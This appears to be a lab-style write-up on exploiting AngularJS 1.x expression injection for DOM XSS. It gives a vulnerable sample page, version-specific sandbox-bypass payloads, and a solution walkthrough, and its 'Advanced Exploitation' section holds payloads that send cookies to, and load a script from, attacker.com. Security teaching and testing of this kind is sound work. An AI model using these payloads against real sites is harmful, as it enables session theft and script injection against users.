# DOM XSS — AngularJS Expression Injection

## When this applies

The page uses **AngularJS** (v1.x — different from modern Angular 2+). Attacker input is interpolated inside an `ng-app`-bound region, but the server HTML-encodes angle brackets and quotes. Traditional XSS payloads fail; AngularJS expression syntax `{{ }}` evaluates *before* HTML rendering, bypassing encoding.

## Technique

`{{ expr }}` inside an `ng-app` scope is evaluated as JavaScript with access to `$scope` properties. By chaining `.constructor` references, attackers reach the Function constructor and execute arbitrary code.

### Vulnerable Code
```html
<body ng-app>
    <div>You searched for: {{searchTerm}}</div>
</body>

<script>
var search = (new URLSearchParams(window.location.search)).get('search');
</script>
```

### Vulnerability Analysis
- **Framework:** AngularJS (version 1.x)
- **Protection:** Angle brackets and quotes are HTML-encoded
- **Bypass:** AngularJS evaluates `{{}}` expressions before encoding
- **Attack vector:** AngularJS expression injection

### Why Traditional Payloads Fail

```html
<script>alert(1)</script> ❌ HTML-encoded
<img src=x onerror=alert(1)> ❌ HTML-encoded
```

AngularJS processes expressions **before** HTML rendering.

## Steps

### Step-by-Step Solution

1. Navigate to the page and search for "test".
2. Observe `ng-app` directive in page source.
3. Try HTML payload — gets encoded.
4. Recognize AngularJS context.
5. Use AngularJS expression: `/?search={{$on.constructor('alert(1)')()}}`.
6. Alert fires.

### Working Payloads

```javascript
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
{{toString.constructor.prototype.toString.constructor('alert(1)')()}}
```

### Payload Breakdown: `{{$on.constructor('alert(1)')()}}`

1. **`{{  }}`** - AngularJS expression delimiters
2. **`$on`** - Built-in AngularJS scope method (a function)
3. **`.constructor`** - Every function's constructor property → `Function`
4. **`('alert(1)')`** - Call Function constructor with code string
5. **`()`** - Immediately execute the created function

### Understanding the Bypass

```javascript
// Step by step
$on                           // Function object
$on.constructor               // Function (the constructor)
$on.constructor('alert(1)')   // Creates: function anonymous() { alert(1) }
$on.constructor('alert(1)')() // Executes the function
```

### AngularJS Version-Specific Payloads

**AngularJS 1.0.x - 1.1.x:**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**AngularJS 1.2.x - 1.5.x (with sandbox):**
```javascript
{{toString.constructor.prototype.toString.constructor('alert(1)')()}}
```

**AngularJS 1.6+ (sandbox removed):**
```javascript
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

### Advanced Exploitation

**Multiple statements:**
```javascript
{{$on.constructor('alert(1);alert(2);alert(3)')()}}
```

**Cookie theft:**
```javascript
{{$on.constructor('document.location="https://attacker.com?c="+document.cookie')()}}
```

**Loading external script:**
```javascript
{{$on.constructor('var s=document.createElement("script");s.src="https://attacker.com/evil.js";document.body.appendChild(s)')()}}
```

### Burp Suite Workflow

**Identifying AngularJS:**
- Look for `ng-app` directive in HTML
- Check for `/angular.js` in script sources
- Browser console: `typeof angular !== 'undefined'`
- Check `angular.version`

**Testing:**
1. Use Repeater to test expression payloads
2. Try different AngularJS bypass techniques
3. Verify expression evaluation in response

## Verifying success

- Expression evaluates and triggers chosen sink (`alert`, fetch, redirect).
- DevTools console: `angular.version` returns the running version (informs which payload works).
- Removing the URL parameter restores the literal `{{searchTerm}}` placeholder text — confirms the expression interpolation was the vector.

## Common pitfalls

1. **Mistaking modern Angular (2+) for AngularJS** — modern Angular doesn't evaluate `{{ }}` from arbitrary string interpolation; this technique applies only to AngularJS 1.x.
2. **Sandbox version mismatch** — using a 1.6+ payload on 1.5.x fails because the sandbox blocks it. Fingerprint version first.
3. **Page loads with no `ng-app`** — context isn't AngularJS. Look elsewhere.
4. **CSP blocks `Function()`** — `script-src` without `'unsafe-eval'` denies the constructor trick. AngularJS 1.x apps usually require `unsafe-eval`, so this is rare.
5. **Input not inside `ng-app` scope** — interpolation only happens within elements bound to an Angular controller / app. Verify the placement of `{{searchTerm}}` reflects your input.

## Tools

- **DOM Invader** — flags Angular contexts
- **`angular.version`** — fingerprint via DevTools
- **PortSwigger AngularJS sandbox bypass list** — version-specific payload reference
- **`patt-fetcher`** — fetch latest AngularJS bypass payloads
